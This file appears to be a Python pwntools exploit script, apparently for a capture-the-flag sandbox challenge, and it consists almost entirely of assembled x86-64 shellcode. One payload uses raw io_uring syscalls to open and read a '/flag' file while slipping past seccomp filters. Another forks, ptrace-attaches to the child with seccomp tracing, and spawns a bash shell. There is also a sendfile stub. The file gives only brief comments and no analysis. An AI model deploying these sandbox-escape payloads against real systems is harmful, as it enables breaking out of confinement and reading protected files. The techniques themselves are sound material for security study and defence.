from pwn import *
from ctypes import *

# sendfile
sendfile = """
xchg rsi, rax;
xor rdi, rdi;
inc rdi;
push 0;
mov rdx, rsp;
push 0x50;
pop r10;
push 40;
pop rax;
syscall;
"""

# io_uring for pass almost all sandbox
io_uring = asm(
    """
    mov rdx, rsp
                mov rbp, rdx
                add rbp, 0xa00  
                mov rbx, rbp
                sub rbx, 0xf0  
                """
)
io_uring += asm(shellcraft.syscall(425, 16, "rbx"))
io_uring += asm(
    """
                 sub rbx, 0x28
                 mov [rbx], rax
                 mov r13, rax 
                 """
)
io_uring += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0))
io_uring += asm(
    """
                 mov [rbp-0x110], rax
                 """
)
io_uring += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0x8000000))
io_uring += asm(
    """
                 mov [rbp-0x108], rax
                 """
)
io_uring += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0x10000000))
io_uring += asm(
    """
                 mov [rbp-0x100], rax
                 xor r13, r13
                 mov [rax], r13
                 mov [rax+8], r13
                 mov [rax+0x10], r13
                 mov [rax+0x18], r13
                 mov [rax+0x20], r13
                 mov [rax+0x28], r13
                 mov [rax+0x30], r13
                 mov [rax+0x38], r13
                 mov rax, [rbp-0x100]
                 mov byte ptr [rax], 0x12
                 mov byte ptr [rax+1], 0x10
                 mov rdx, 0x67616c662f
                 mov [rbp+0x100], rdx
                 mov rdx, rbp
                 add rdx, 0x100
                 mov [rax+0x10], rdx
                 mov eax, [rbp-0xB0]
                 mov edx, eax
                 mov rax, [rbp-0x110]
                 add rax, rdx
                 mov     [rax], r13
                 mov     eax, [rbp-0xC4]
                 mov     edx, eax
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     edx, [rax]
                 add     edx, 1
                 mov     [rax], edx
                 mov     r12, [rbp-0x118]
                 xor     rax, rax
                 sub     rsp, 8
                 push    0
                 """
)
io_uring += asm(shellcraft.syscall(426, "r12", 1, 1, 1, 0, 0))
io_uring += asm(
    """
                 add rsp, 0x10
                 mov     eax, [rbp-0x8C]
                 mov     edx, eax
                 mov     rax, [rbp-0x108]
                 add     rax, rdx
                 mov     [rbp-0xF8], rax
                 mov     rax, [rbp-0xF8]
                 mov     eax, [rax+8]
                 mov     [rbp-0x114], eax
                 lea     rdx, [rbp-0x70]
                 mov     rax, [rbp-0x100]
                 mov [rax], r13
                 mov [rax+8], r13
                 mov [rax+0x10], r13
                 mov [rax+0x18], r13
                 mov [rax+0x20], r13
                 mov [rax+0x28], r13
                 mov [rax+0x30], r13
                 mov [rax+0x38], r13
                 mov rax, [rbp-0x100]
                 mov byte ptr [rax], 0x16
                 mov     ecx, [rbp-0x114]
                 mov     [rax+4], ecx
                 mov     [rax+0x10], rdx
                 mov     rbx, 0x64
                 mov     [rax+0x18], rbx
                 mov     edx, [rbp-0xB0]
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     [rax], r13             
                 mov     eax, [rbp-0xC4]    
                 mov     edx, eax
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     edx, [rax]
                 add     edx, 1
                 mov     [rax], edx
                 mov     r12, [rbp-0x118]
                 xor     rax, rax
                 sub     rsp, 8
                 push    0
                 """
)
io_uring += asm(shellcraft.syscall(426, "r12", 1, 1, 1, 0, 0))
io_uring += asm(
    """
                 add rsp, 0x10
                 lea     rdx, [rbp-0x70]
                 mov     rax, [rbp-0x100]
                 mov [rax], r13
                 mov [rax+8], r13
                 mov [rax+0x10], r13
                 mov [rax+0x18], r13
                 mov [rax+0x20], r13
                 mov [rax+0x28], r13
                 mov [rax+0x30], r13
                 mov [rax+0x38], r13
                 mov rax, [rbp-0x100]
                 mov byte ptr [rax], 0x17
                 mov     ecx, 1
                 mov     [rax+4], ecx
                 mov     [rax+0x10], rdx
                 mov     rbx, 0x64
                 mov     [rax+0x18], rbx
                 mov     edx, [rbp-0xB0]
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     [rax], r13             
                 mov     eax, [rbp-0xC4]    
                 mov     edx, eax
                 mov     rax, [rbp-0x110]
                 add     rax, rdx
                 mov     edx, [rax]
                 add     edx, 1
                 mov     [rax], edx
                 mov     r12, [rbp-0x118]
                 xor     rax, rax
                 sub     rsp, 8
                 push    0
                 """
)
io_uring += asm(shellcraft.syscall(426, "r12", 1, 3, 1, 0, 0))

order2 = b"h\x00"[::-1].hex()
order1 = b"/bin/bas"[::-1].hex()

# for passing RETURE TRACE
ret_trace = asm(
    f"""
_start:

    /* Step 1: fork a new process */
    mov rax, 57             /* syscall number for fork (on x86_64) */
    syscall                 /* invoke fork() */

    test rax, rax           /* check if return value is 0 (child) or positive (parent) */
    js _exit                /* if fork failed, exit */

    /* Step 2: If parent process, attach to child process */
    cmp rax, 0              /* are we the child process? */
    je child_process        /* if yes, jump to child_process */

parent_process:
    /* Store child PID */
    mov r8,rax

    mov rsi, r8            /* rdi = child PID */

    /* Attach to child process */
    mov rax, 101            /* syscall number for ptrace */
    mov rdi, 0x10           /* PTRACE_ATTACH */
    xor rdx, rdx            /* no options */
    xor r10, r10            /* no data */
    syscall                 /* invoke ptrace(PTRACE_ATTACH, child_pid, 0, 0) */

monitor_child:
    /* Wait for the child to stop */
    
    mov rdi, r8            /* rdi = child PID */
    mov rsi, rsp            /*  no status*/
    xor rdx, rdx            /* no options */
    xor r10, r10            /* no rusage */
    mov rax, 61             /* syscall number for wait4 */
    syscall                 /* invoke wait4() */

    /* Set ptrace options */
    mov rax, 110
    syscall    
    mov rdi, 0x4200         /* PTRACE_SETOPTIONS */
    mov rsi, r8            /* rsi = child PID */
    xor rdx, rdx            /* no options */
    mov r10, 0x00000080     /* PTRACE_O_TRACESECCOMP */
    mov rax, 101            /* syscall number for ptrace */
    syscall                 /* invoke ptrace(PTRACE_SETOPTIONS, child_pid, 0, 0) */

    /* Allow the child process to continue */
    mov rax, 110
    syscall
    
    mov rdi, 0x7            /* PTRACE_CONT */
    mov rsi, r8            /* rsi = child PID */
    xor rdx, rdx            /* no options */
    xor r10, r10            /* no data */
    mov rax, 101            /* syscall number for ptrace */
    syscall                 /* invoke ptrace(PTRACE_CONT, child_pid, 0, 0) */

    /* Loop to keep monitoring the child */
    jmp monitor_child

child_process:
    /* Child process code here */
    /* For example, we could execute a shell or perform other actions */
    /* To keep it simple, let's just execute `/bin/sh` */
                
    /* sleep(5) */
    /* push 0 */
    push 1
    dec byte ptr [rsp]
    /* push 5 */
    push 5
    /* nanosleep(requested_time='rsp', remaining=0) */
    mov rdi, rsp
    xor esi, esi /* 0 */
    /* call nanosleep() */
    push SYS_nanosleep /* 0x23 */
    pop rax
    syscall

    mov rax, 0x{order2}  /* "/bin/sh" */
    push rax
    mov rax, 0x{order1}  /* "/bin/sh" */
    push rax
    mov rdi, rsp    
    mov rsi, 0
    xor rdx, rdx
    mov rax, 59             /* syscall number for execve */
    syscall
    jmp child_process

_exit:
    /* Exit the process */
    mov rax, 60             /* syscall number for exit */
    xor rdi, rdi            /* status 0 */
    syscall
"""
)
